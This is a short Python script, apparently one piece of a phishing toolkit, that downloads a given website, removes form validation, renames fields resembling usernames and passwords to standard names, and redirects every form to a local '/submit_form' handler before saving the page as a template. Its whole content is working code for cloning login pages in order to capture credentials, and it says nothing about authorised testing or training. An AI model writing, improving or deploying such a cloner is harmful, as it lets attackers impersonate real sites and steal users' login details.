import requests
from bs4 import BeautifulSoup
import os

# Function to remove validation elements from the HTML soup
def remove_validation_elements(soup):
    validation_attributes = ['required', 'pattern', 'minlength', 'maxlength', 'min', 'max', 'step']

    # Remove validation attributes from input tags
    for input_tag in soup.find_all('input'):
        for attr in validation_attributes:
            if attr in input_tag.attrs:
                del input_tag[attr]

        # Attempt to remove <code> tags associated with input tags
        parent = input_tag.parent
        for code_tag in parent.find_all('code'):
            code_tag.decompose()

    #Remove standalone <code> tags that might be used for validation
    for code_tag in soup.find_all('code'):
        code_tag.decompose()

def identify_and_modify_input_fields(soup):
    # Common identifiers for username and password fields
    common_username_attributes = ['email', 'login', 'username', 'e-mail','userid', 'name','account','uid']
    common_password_attributes = ['password','pass','passwd', 'pword','secret','key','token']

    # Attempt to smartly identify and modify fields
    username_identified = False
    password_identified = False

    for input_tag in soup.find_all('input'):
        # Remove the value attribute from input fields
        if 'value' in input_tag.attrs:
            del input_tag['value']
        if not username_identified and any(attr in input_tag.get('name', '').lower() for attr in common_username_attributes):
            input_tag['id'] = 'username'
            input_tag['name'] = 'username'
            username_identified = True
        elif not password_identified and any(attr in input_tag.get('name', '').lower() for attr in common_password_attributes):
            input_tag['id'] = 'password'
            input_tag['name'] = 'password'
            password_identified = True

# Function to modify form action in the HTML soup
def modify_form_action(soup):
    # Modify form actions and remove 'id' and 'class' attributes
    forms = soup.find_all('form')
    for form in forms:
        form['action'] = '/submit_form'
        # Remove 'id' and 'class' attributes if present
        if 'id' in form.attrs:
            del form['id']
        if 'class' in form.attrs:
            del form['class']


# Function to clone a website and apply modifications
def clone_website():
    url = input("Enter the URL of the website to clone: ").strip()

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        print("Failed to clone website:", e)
        return

    soup = BeautifulSoup(response.content, 'html.parser')

    # Apply modifications
    remove_validation_elements(soup)
    identify_and_modify_input_fields(soup)
    modify_form_action(soup)

    filename = input("Enter the name to save the cloned file (without extension): ").strip()
    new_templates_dir = 'websitecloner/new_templates'
    
    # Modify the file path to include the storage directory
    file_path = os.path.join(new_templates_dir, f"{filename}.html")

    with open(f"{file_path}", 'w', encoding='utf-8') as file:
        file.write(str(soup))

    print("Website cloned, input validation removed, form action modified, and form identifiers removed successfully. Cloned file saved as:", f"{filename}.html")

if __name__ == "__main__":
    clone_website()
